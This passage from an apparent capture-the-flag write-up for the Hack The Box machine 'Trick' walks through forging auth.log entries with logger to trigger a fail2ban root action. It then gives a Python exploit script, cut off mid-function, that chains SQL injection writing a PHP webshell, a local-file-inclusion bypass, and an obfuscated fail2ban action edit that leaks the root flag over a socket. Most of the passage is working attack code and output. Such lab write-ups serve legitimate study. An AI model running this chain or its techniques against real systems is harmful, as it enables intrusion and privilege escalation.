+<p>I force copy the edited file and restart the service. The next step is to trigger the <strong>ban</strong>. I could connect with SSH multiple times using wrong passwords, but I found a more convenient way without using SSH. fail2ban evaluates the <code>/var/log/auth.log</code> and I can insert own entries, even as low privilege user, using the <code>logger</code> command.
+Example:</p>
+<div class="highlight"><pre><span></span><code>logger --tag sshd --id=1337 -p auth.info &#39;Failed password for invalid user root from 192.192.192.192 port 31337 ssh2
+</code></pre></div>
+
+<p>Execute that multiple times.
+As root, I can read <code>/var/log/auth.log</code> showing the "failed" login attempts.</p>
+<div class="highlight"><pre><span></span><code>root@trick:~# grep sshd /var/log/auth.log | tail -n 50
+Jul  4 16:07:06 trick sshd[736]: Server listening on 0.0.0.0 port 22.
+Jul  4 16:07:06 trick sshd[736]: Server listening on :: port 22.
+Jul  4 16:07:47 trick sshd[1420]: Accepted publickey for michael from 10.10.14.8 port 55006 ssh2: RSA SHA256:atxLrfKmJx7UnzFLBxxRGjx8LbA+7NMV3rxcRHbvDpY
+Jul  4 16:07:47 trick sshd[1420]: pam_unix(sshd:session): session opened for user michael by (uid=0)
+Jul  4 16:10:55 trick sshd[1337]: Failed password for invalid user root from 192.192.192.192 port 31337 ssh2
+Jul  4 16:10:57 trick sshd[1337]: Failed password for invalid user root from 192.192.192.192 port 31337 ssh2
+Jul  4 16:10:59 trick sshd[1337]: Failed password for invalid user root from 192.192.192.192 port 31337 ssh2
+Jul  4 16:11:01 trick sshd[1337]: Failed password for invalid user root from 192.192.192.192 port 31337 ssh2
+Jul  4 16:11:03 trick sshd[1337]: Failed password for invalid user root from 192.192.192.192 port 31337 ssh2
+Jul  4 16:11:05 trick sshd[1337]: Failed password for invalid user root from 192.192.192.192 port 31337 ssh2
+Jul  4 16:11:07 trick sshd[1337]: Failed password for invalid user root from 192.192.192.192 port 31337 ssh2
+Jul  4 16:11:09 trick sshd[1337]: Failed password for invalid user root from 192.192.192.192 port 31337 ssh2
+Jul  4 16:11:11 trick sshd[1337]: Failed password for invalid user root from 192.192.192.192 port 31337 ssh2
+Jul  4 16:11:14 trick sshd[1337]: Failed password for invalid user root from 192.192.192.192 port 31337 ssh2
+Jul  4 16:11:16 trick sshd[1337]: Failed password for invalid user root from 192.192.192.192 port 31337 ssh2
+Jul  4 16:11:18 trick sshd[1337]: Failed password for invalid user root from 192.192.192.192 port 31337 ssh2
+</code></pre></div>
+
+<p>fail2ban evaluate those login attempts and executes the ban command.</p>
+<div class="highlight"><pre><span></span><code>2022-07-04 16:10:46,002 fail2ban.server         [1556]: INFO    Starting Fail2ban v0.10.2
+2022-07-04 16:10:46,005 fail2ban.database       [1556]: INFO    Connected to fail2ban persistent database &#39;/var/lib/fail2ban/fail2ban.sqlite3&#39;
+2022-07-04 16:10:46,006 fail2ban.jail           [1556]: INFO    Creating new jail &#39;sshd&#39;
+2022-07-04 16:10:46,015 fail2ban.jail           [1556]: INFO    Jail &#39;sshd&#39; uses pyinotify {}
+2022-07-04 16:10:46,017 fail2ban.jail           [1556]: INFO    Initiated &#39;pyinotify&#39; backend
+2022-07-04 16:10:46,018 fail2ban.filter         [1556]: INFO      maxLines: 1
+2022-07-04 16:10:46,039 fail2ban.server         [1556]: INFO    Jail sshd is not a JournalFilter instance
+2022-07-04 16:10:46,040 fail2ban.filter         [1556]: INFO    Added logfile: &#39;/var/log/auth.log&#39; (pos = 5500, hash = 90c976114ab00901e0f4bcb8b77ca2eeb4f7a3ad)
+2022-07-04 16:10:46,043 fail2ban.filter         [1556]: INFO      encoding: UTF-8
+2022-07-04 16:10:46,043 fail2ban.filter         [1556]: INFO      maxRetry: 5
+2022-07-04 16:10:46,043 fail2ban.filter         [1556]: INFO      findtime: 10
+2022-07-04 16:10:46,043 fail2ban.actions        [1556]: INFO      banTime: 10
+2022-07-04 16:10:46,045 fail2ban.jail           [1556]: INFO    Jail &#39;sshd&#39; started
+2022-07-04 16:11:16,001 fail2ban.filter         [1556]: INFO    [sshd] Found 192.192.192.192 - 2022-07-04 16:10:55
+2022-07-04 16:11:16,001 fail2ban.filter         [1556]: INFO    [sshd] Found 192.192.192.192 - 2022-07-04 16:11:07
+2022-07-04 16:11:16,001 fail2ban.filter         [1556]: INFO    [sshd] Found 192.192.192.192 - 2022-07-04 16:11:09
+2022-07-04 16:11:16,002 fail2ban.filter         [1556]: INFO    [sshd] Found 192.192.192.192 - 2022-07-04 16:11:11
+2022-07-04 16:11:16,002 fail2ban.filter         [1556]: INFO    [sshd] Found 192.192.192.192 - 2022-07-04 16:11:14
+2022-07-04 16:11:16,004 fail2ban.filter         [1556]: INFO    [sshd] Found 192.192.192.192 - 2022-07-04 16:11:16
+2022-07-04 16:11:16,080 fail2ban.actions        [1556]: NOTICE  [sshd] Ban 192.192.192.192
+</code></pre></div>
+
+<p>Now I try to connect to port 35345.</p>
+<div class="highlight"><pre><span></span><code>$ nc <span class="m">127</span>.0.0.1 <span class="m">35345</span>
+AABBCCDDEEFFGGHHIIJJKKLLMMNNOOPPQQ
+</code></pre></div>
+
+<p>Done. I got the root flag. I could have also spawned a reverse root shell, but wasn't necessary.</p>
+<p>Here is the all in one PoC to pwn the machine.</p>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python</span>
+<span class="kn">import</span> <span class="nn">logging</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">re</span>
+<span class="kn">import</span> <span class="nn">socket</span>
+<span class="kn">import</span> <span class="nn">fcntl</span>
+<span class="kn">import</span> <span class="nn">struct</span>
+<span class="kn">import</span> <span class="nn">time</span>
+
+<span class="n">logger</span> <span class="o">=</span> <span class="n">logging</span><span class="o">.</span><span class="n">getLogger</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+<span class="n">ch</span> <span class="o">=</span> <span class="n">logging</span><span class="o">.</span><span class="n">StreamHandler</span><span class="p">()</span>
+<span class="n">ch</span><span class="o">.</span><span class="n">setLevel</span><span class="p">(</span><span class="n">logging</span><span class="o">.</span><span class="n">DEBUG</span><span class="p">)</span>
+
+
+<span class="k">class</span> <span class="nc">CustomFormatter</span><span class="p">(</span><span class="n">logging</span><span class="o">.</span><span class="n">Formatter</span><span class="p">):</span>
+    <span class="sd">&quot;&quot;&quot;Formatter class to generate colourful log message&quot;&quot;&quot;</span>
+    <span class="n">grey</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x1b</span><span class="s2">[38;20m&quot;</span>
+    <span class="n">blue</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\x1b</span><span class="s1">[38;5;39m&#39;</span>
+    <span class="n">yellow</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x1b</span><span class="s2">[33;20m&quot;</span>
+    <span class="n">red</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x1b</span><span class="s2">[31;20m&quot;</span>
+    <span class="n">bold_red</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x1b</span><span class="s2">[31;1m&quot;</span>
+    <span class="n">reset</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x1b</span><span class="s2">[0m&quot;</span>
+    <span class="n">FORMAT</span> <span class="o">=</span> <span class="s2">&quot;[</span><span class="si">%(filename)s</span><span class="s2">:</span><span class="si">%(lineno)s</span><span class="s2"> - </span><span class="si">%(funcName)20s</span><span class="s2">() ] </span><span class="si">%(message)s</span><span class="s2">&quot;</span>
+    <span class="c1"># FORMAT = &quot;%(asctime)s - %(name)s - %(levelname)s - %(message)s (%(filename)s:%(lineno)d)&quot;</span>
+
+    <span class="n">FORMATS</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="n">logging</span><span class="o">.</span><span class="n">DEBUG</span><span class="p">:</span> <span class="n">blue</span> <span class="o">+</span> <span class="n">FORMAT</span> <span class="o">+</span> <span class="n">reset</span><span class="p">,</span>
+        <span class="n">logging</span><span class="o">.</span><span class="n">INFO</span><span class="p">:</span> <span class="n">grey</span> <span class="o">+</span> <span class="n">FORMAT</span> <span class="o">+</span> <span class="n">reset</span><span class="p">,</span>
+        <span class="n">logging</span><span class="o">.</span><span class="n">WARNING</span><span class="p">:</span> <span class="n">yellow</span> <span class="o">+</span> <span class="n">FORMAT</span> <span class="o">+</span> <span class="n">reset</span><span class="p">,</span>
+        <span class="n">logging</span><span class="o">.</span><span class="n">ERROR</span><span class="p">:</span> <span class="n">red</span> <span class="o">+</span> <span class="n">FORMAT</span> <span class="o">+</span> <span class="n">reset</span><span class="p">,</span>
+        <span class="n">logging</span><span class="o">.</span><span class="n">CRITICAL</span><span class="p">:</span> <span class="n">bold_red</span> <span class="o">+</span> <span class="n">FORMAT</span> <span class="o">+</span> <span class="n">reset</span>
+    <span class="p">}</span>
+
+    <span class="k">def</span> <span class="nf">format</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">record</span><span class="p">):</span>
+        <span class="sd">&quot;&quot;&quot;</span>
+
+<span class="sd">        Args:</span>
+<span class="sd">          record (dict): attribute dictionary for string formatting operation</span>
+
+<span class="sd">        Returns:</span>
+<span class="sd">            str: The formatted string</span>
+
+<span class="sd">        &quot;&quot;&quot;</span>
+        <span class="n">log_fmt</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">FORMATS</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">record</span><span class="o">.</span><span class="n">levelno</span><span class="p">)</span>
+        <span class="n">formatter</span> <span class="o">=</span> <span class="n">logging</span><span class="o">.</span><span class="n">Formatter</span><span class="p">(</span><span class="n">log_fmt</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">formatter</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">record</span><span class="p">)</span>
+
+
+<span class="n">ch</span><span class="o">.</span><span class="n">setFormatter</span><span class="p">(</span><span class="n">CustomFormatter</span><span class="p">())</span>
+<span class="n">logger</span><span class="o">.</span><span class="n">addHandler</span><span class="p">(</span><span class="n">ch</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">sql_injection_str2file</span><span class="p">(</span><span class="n">test</span><span class="o">=</span><span class="kc">False</span><span class="p">):</span>
+    <span class="sd">&quot;&quot;&quot; Using the SQL injection in the manage_employeed.php endpoint to write a simple PHP shell to `/tmp/phpcmd.php`.</span>
+
+<span class="sd">    Args:</span>
+<span class="sd">      test:  (Default value = False) wether to test the injection only</span>
+
+<span class="sd">    Returns:</span>
+<span class="sd">        None</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="n">logger</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="s2">&quot;Starting SQL injection&quot;</span><span class="p">)</span>
+    <span class="n">endpoint</span> <span class="o">=</span> <span class="s2">&quot;http://preprod-payroll.trick.htb/manage_employee.php?id=-1&quot;</span>
+    <span class="n">injectionstr</span> <span class="o">=</span> <span class="s2">&quot;UNION ALL SELECT NULL,NULL,NULL,NULL,</span><span class="si">{}</span><span class="s2">,NULL,NULL,NULL&quot;</span>
+    <span class="k">with</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span> <span class="k">as</span> <span class="n">s</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">test</span><span class="p">:</span>
+            <span class="n">logger</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="s2">&quot;Testing SQL injection&quot;</span><span class="p">)</span>
+            <span class="n">injection</span> <span class="o">=</span> <span class="n">injectionstr</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="s1">&#39;0x3a3a666f6f6261723a3a&#39;</span><span class="p">)</span>
+            <span class="n">req</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">endpoint</span><span class="si">}</span><span class="s2"> </span><span class="si">{</span><span class="n">injection</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+            <span class="k">if</span> <span class="p">((</span><span class="n">content</span> <span class="o">:=</span> <span class="n">req</span><span class="o">.</span><span class="n">text</span><span class="p">)</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">&quot;::foobar::&quot;</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">):</span>
+                <span class="n">logger</span><span class="o">.</span><span class="n">critical</span><span class="p">(</span><span class="s2">&quot;SQL injection failed&quot;</span><span class="p">)</span>
+                <span class="n">logger</span><span class="o">.</span><span class="n">critical</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
+                <span class="k">if</span> <span class="s2">&quot;502 Bad Gateway&quot;</span> <span class="ow">in</span> <span class="n">content</span><span class="p">:</span>
+                    <span class="n">logger</span><span class="o">.</span><span class="n">critical</span><span class="p">(</span><span class="s2">&quot;You should reset the machine, maybe the PHP process isn&#39;t working anymore&quot;</span><span class="p">)</span>
+                <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+            <span class="n">logger</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="s2">&quot;SQL injection success&quot;</span><span class="p">)</span>
+            <span class="k">return</span> <span class="kc">None</span>
+        <span class="n">injection</span> <span class="o">=</span> <span class="n">injectionstr</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="s2">&quot;CONCAT(0x3a5e5e3a,LOAD_FILE(&#39;/tmp/phpcmd.php&#39;),0x3a5e5e3a)&quot;</span><span class="p">)</span>
+        <span class="n">req</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">endpoint</span><span class="si">}</span><span class="s2"> </span><span class="si">{</span><span class="n">injection</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+        <span class="n">content</span> <span class="o">=</span> <span class="n">req</span><span class="o">.</span><span class="n">text</span>
+        <span class="n">filecontent</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span>
+                <span class="sa">r</span><span class="sd">&quot;&quot;&quot;&lt;input type=&quot;text&quot; name=&quot;lastname&quot; required=&quot;required&quot; class=&quot;form-control&quot; value=&quot;:\^\^:(.*?):\^\^:&quot; /&gt;&quot;&quot;&quot;</span><span class="p">,</span> <span class="n">content</span><span class="p">,</span> <span class="n">re</span><span class="o">.</span><span class="n">M</span> <span class="o">|</span> <span class="n">re</span><span class="o">.</span><span class="n">S</span>
+        <span class="p">)</span>
+        <span class="c1"># Inject only if the PHP shell isn&#39;t already present</span>
+        <span class="k">if</span> <span class="s2">&quot;&quot;&quot;&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;&quot;&quot;&quot;</span> <span class="ow">in</span> <span class="n">filecontent</span><span class="p">[:</span><span class="mi">1</span><span class="p">]:</span>
+            <span class="n">logger</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="s2">&quot;PHP Shell already present&quot;</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">injection</span> <span class="o">=</span> <span class="s2">&quot;UNION ALL SELECT 0x3c3f7068702073797374656d28245f4745545b27636d64275d293b203f3e0a,0x0a,0x0a,0x0a,0x0a,0x0a,0x0a,0x0a &quot;</span> \
+                <span class="s2">&quot;INTO DUMPFILE &#39;/tmp/phpcmd.php&#39;-- -&quot;</span>
+            <span class="n">req</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">endpoint</span><span class="si">}</span><span class="s2"> </span><span class="si">{</span><span class="n">injection</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">lfi_rce_payroll</span><span class="p">():</span>
+    <span class="sd">&quot;&quot;&quot;Using the injected and written PHP shell `tmp/phpcmd.php` to execute commands, extracting the output from the web page.</span>
+<span class="sd">    The used endpoint belongs to `preprod-payroll.trick.htb/index.php?page=`.</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="c1"># The vulnerable PHP code below</span>
+    <span class="c1"># &lt;?php $page = isset($_GET[&#39;page&#39;]) ? $_GET[&#39;page&#39;] :&#39;home&#39;; ?&gt;</span>
+    <span class="c1"># &lt;?php include $page.&#39;.php&#39; ?&gt;</span>
+    <span class="n">logger</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="s2">&quot;Starting Payroll LFI/RCE&quot;</span><span class="p">)</span>
+    <span class="n">cmd</span> <span class="o">=</span> <span class="s2">&quot;cat /var/www/market/index.php&quot;</span>
+    <span class="n">TESTCMD</span> <span class="o">=</span> <span class="s2">&quot;echo ]foobar[&quot;</span>
+    <span class="n">endpoint</span> <span class="o">=</span> <span class="s2">&quot;http://preprod-payroll.trick.htb/index.php?page=/tmp/phpcmd&amp;cmd=</span><span class="si">{}</span><span class="s2">&quot;</span>
+    <span class="k">with</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span> <span class="k">as</span> <span class="n">s</span><span class="p">:</span>
+        <span class="n">req</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">endpoint</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">TESTCMD</span><span class="p">),</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+        <span class="n">content</span> <span class="o">=</span> <span class="n">req</span><span class="o">.</span><span class="n">text</span>
+        <span class="n">cmdout</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;&lt;main id=&quot;view-panel&quot; &gt;(.*)&lt;/main&gt;&#39;</span><span class="p">,</span> <span class="n">content</span><span class="p">,</span> <span class="n">re</span><span class="o">.</span><span class="n">M</span> <span class="o">|</span> <span class="n">re</span><span class="o">.</span><span class="n">S</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+        <span class="k">if</span> <span class="s2">&quot;]foobar[&quot;</span> <span class="ow">in</span> <span class="n">cmdout</span><span class="p">:</span>
+            <span class="n">logger</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="s2">&quot;PHP Shell working, we have RCE&quot;</span><span class="p">)</span>
+            <span class="n">req</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">endpoint</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">cmd</span><span class="p">),</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+            <span class="n">content</span> <span class="o">=</span> <span class="n">req</span><span class="o">.</span><span class="n">text</span>
+            <span class="n">cmdout</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;&lt;main id=&quot;view-panel&quot; &gt;(.*)&lt;/main&gt;&#39;</span><span class="p">,</span> <span class="n">content</span><span class="p">,</span> <span class="n">re</span><span class="o">.</span><span class="n">M</span> <span class="o">|</span> <span class="n">re</span><span class="o">.</span><span class="n">S</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+            <span class="n">logger</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="n">cmdout</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">logger</span><span class="o">.</span><span class="n">critical</span><span class="p">(</span><span class="s2">&quot;Payroll RCE failed&quot;</span><span class="p">)</span>
+            <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">lfi_rce_marketing</span><span class="p">(</span><span class="n">cmd</span><span class="o">=</span><span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="n">test</span><span class="o">=</span><span class="kc">False</span><span class="p">):</span>
+    <span class="sd">&quot;&quot;&quot;Using the injected and written PHP shell `/tmp/phpcmd.php` in the `marketing` vhost to execute commands and extract the</span>
+<span class="sd">    output from the web page.</span>
+<span class="sd">    The commands are executed as local user `michael`</span>
+
+<span class="sd">    Args:</span>
+<span class="sd">      cmd (str):  (Default value = &quot;&quot;) The cmd to execute</span>
+<span class="sd">      test (bool):  (Default value = False) If true, validate if RCE works</span>
+
+<span class="sd">    Returns:</span>
+<span class="sd">        str: the output of the executed cmd</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="c1"># The vulnerable PHP code below</span>
+    <span class="c1"># $file = $_GET[&#39;page&#39;];</span>
+    <span class="c1"># include(&quot;/var/www/market/&quot;.str_replace(&quot;../&quot;,&quot;&quot;,$file));</span>
+    <span class="k">if</span> <span class="n">test</span><span class="p">:</span>
+        <span class="n">logger</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="s2">&quot;Testing Marketing LFI/RCE&quot;</span><span class="p">)</span>
+    <span class="n">TESTCMD</span> <span class="o">=</span> <span class="s2">&quot;echo ]foobar[&quot;</span>
+    <span class="n">endpoint</span> <span class="o">=</span> <span class="s2">&quot;http://preprod-payroll.trick.htb/index.php?page=....//....//....//tmp/phpcmd.php&amp;cmd=</span><span class="si">{}</span><span class="s2">&quot;</span>
+    <span class="c1"># Setting the Host header to reach the `marketing` vhost</span>
+    <span class="c1"># I could also set the DNS record of `preprod-marketing.trick.htb` to the targets IP</span>
+    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s2">&quot;Host&quot;</span><span class="p">:</span> <span class="s2">&quot;preprod-marketing.trick.htb&quot;</span>
+    <span class="p">}</span>
+    <span class="k">with</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span> <span class="k">as</span> <span class="n">s</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">test</span><span class="p">:</span>
+            <span class="n">req</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">endpoint</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">TESTCMD</span><span class="p">),</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+            <span class="n">content</span> <span class="o">=</span> <span class="n">req</span><span class="o">.</span><span class="n">text</span>
+            <span class="c1"># logger.debug(content)</span>
+            <span class="n">cmdout</span> <span class="o">=</span> <span class="n">content</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+            <span class="k">if</span> <span class="s2">&quot;]foobar[&quot;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">cmdout</span><span class="p">:</span>
+                <span class="n">logger</span><span class="o">.</span><span class="n">critical</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Marketing RCE failed, cmd was: </span><span class="si">{</span><span class="n">TESTCMD</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+                <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="n">logger</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="s2">&quot;Marketing LFI/RCE success&quot;</span><span class="p">)</span>
+        <span class="n">logger</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
+        <span class="n">req</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">endpoint</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">cmd</span><span class="p">),</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+        <span class="n">content</span> <span class="o">=</span> <span class="n">req</span><span class="o">.</span><span class="n">text</span>
+        <span class="n">cmdout</span> <span class="o">=</span> <span class="n">content</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+        <span class="k">return</span> <span class="n">cmdout</span>
+
+
+<span class="k">def</span> <span class="nf">user_flag</span><span class="p">():</span>
+    <span class="sd">&quot;&quot;&quot;Extract the user flag using various exploitation techniques.</span>
+<span class="sd">    The LFI in the marketing endpoint is executed as user michael, allowing us to read the `user.txt` file in the home directory.</span>
+<span class="sd">    Returns:</span>
+<span class="sd">        str: the user flag</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="n">sql_injection_str2file</span><span class="p">()</span>
+    <span class="n">user_flag</span> <span class="o">=</span> <span class="n">lfi_rce_marketing</span><span class="p">(</span><span class="s2">&quot;cat /home/michael/user.txt&quot;</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">user_flag</span>
+
+
+<span class="k">def</span> <span class="nf">root_flag</span><span class="p">(</span><span class="n">lip</span><span class="p">,</span> <span class="n">tip</span><span class="p">):</span>
+    <span class="sd">&quot;&quot;&quot;Extract the users flag using various exploitation techniques.</span>
+<span class="sd">    User michael is abel to use sudo to restart fail2ban, shown by `sudo -l`. The user is part of the security group that can create and delete</span>
+<span class="sd">    files in `/etc/fail2ban/action.d/`, but don&#39;t change.</span>
+<span class="sd">    By copying and altering the ban command in `iptables-multiport.conf`, a python script is executed that reads the root flag and outputs the</span>
+<span class="sd">    content to the first client connecting on port 35345. After changing the ban command the file is force copied to the original location and</span>
+<span class="sd">    fail2ban restarted using the sudo command.</span>
+<span class="sd">    To trigger the ban command, I could connect and falsely authenticate to the SSH daemon multiple times. Instead I inject simulated failed login</span>
+<span class="sd">    attempts in the `/var/log/auth.log` leveraging the `logger` linux command.</span>
+<span class="sd">    After a short wait time the script connects to the hopefully running python socket and receives the root flag.</span>
+
+<span class="sd">    Args:</span>
+<span class="sd">      lip (str): The local IP (attacker machine)</span>
+<span class="sd">      tip (str): The target IP</span>
+
+<span class="sd">    Returns:</span>
+<span class="sd">        str: the user flag</span>
+
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="n">sql_injection_str2file</span><span class="p">()</span>
+    <span class="n">sudo_check</span> <span class="o">=</span> <span class="s2">&quot;(root) NOPASSWD: /etc/init.d/fail2ban restart&quot;</span>
+    <span class="k">if</span> <span class="n">sudo_check</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">lfi_rce_marketing</span><span class="p">(</span><span class="s2">&quot;sudo -l&quot;</span><span class="p">):</span>
+        <span class="n">logger</span><span class="o">.</span><span class="n">critical</span><span class="p">(</span><span class="s2">&quot;fail2ban restart not executable with sudo&quot;</span><span class="p">)</span>
+        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">lfi_rce_marketing</span><span class="p">(</span><span class="s2">&quot;which python3&quot;</span><span class="p">):</span>
+        <span class="n">logger</span><span class="o">.</span><span class="n">critical</span><span class="p">(</span><span class="s2">&quot;python3 not available&quot;</span><span class="p">)</span>
+        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="n">lfi_rce_marketing</span><span class="p">(</span><span class="s2">&quot;cp /etc/fail2ban/action.d/iptables-multiport.conf /tmp/im.conf.tmp&quot;</span><span class="p">)</span>
+    <span class="n">cmd</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span>
+        <span class="sa">r</span><span class="sd">&quot;&quot;&quot;sed -i &quot;s/&lt;iptables&gt; -I f2b-&lt;name&gt; 1 -s &lt;ip&gt; -j &lt;blocktype&gt;/&quot;&quot;&quot;</span><span class="p">,</span>
+        <span class="sa">r</span><span class="sd">&quot;&quot;&quot;python3 \-c &#39;exec\(\&quot;\\\nimport socket\\\n&quot;&quot;&quot;</span><span class="p">,</span>
+        <span class="sa">r</span><span class="sd">&quot;&quot;&quot;d\=lambda istr\: bytes\.fromhex\(hex\(istr\)\[2\:\]\)\.decode\(\)\\\n&quot;&quot;&quot;</span><span class="p">,</span>
+        <span class="sa">r</span><span class="sd">&quot;&quot;&quot;s\=socket\.socket\(socket\.AF_INET,socket\.SOCK_STREAM\)\\\n&quot;&quot;&quot;</span><span class="p">,</span>
+        <span class="sa">r</span><span class="sd">&quot;&quot;&quot;s\.setsockopt\(socket\.SOL_SOCKET, socket\.SO_REUSEADDR, 1\)\\\n&quot;&quot;&quot;</span><span class="p">,</span>
+        <span class="sa">r</span><span class="sd">&quot;&quot;&quot;s\.bind\(\(d\(13561583350328880\),35345\)\)\\\ns\.listen\(5\)\\\nc,a\=s\.accept\(\)\\\n&quot;&quot;&quot;</span><span class="p">,</span>
+        <span class="sa">r</span><span class="sd">&quot;&quot;&quot;c\.sendall\(open\(d\(962339749473780545853982382520436\), d\(29282\)\)\.read\(\)\)\\\n&quot;&quot;&quot;</span><span class="p">,</span>
+        <span class="sa">r</span><span class="sd">&quot;&quot;&quot;\&quot;\)&#39;/g&quot; /tmp/im.conf.tmp&quot;&quot;&quot;</span><span class="p">,</span>
+    <span class="p">])</span>
+    <span class="n">logger</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
+    <span class="n">lfi_rce_marketing</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
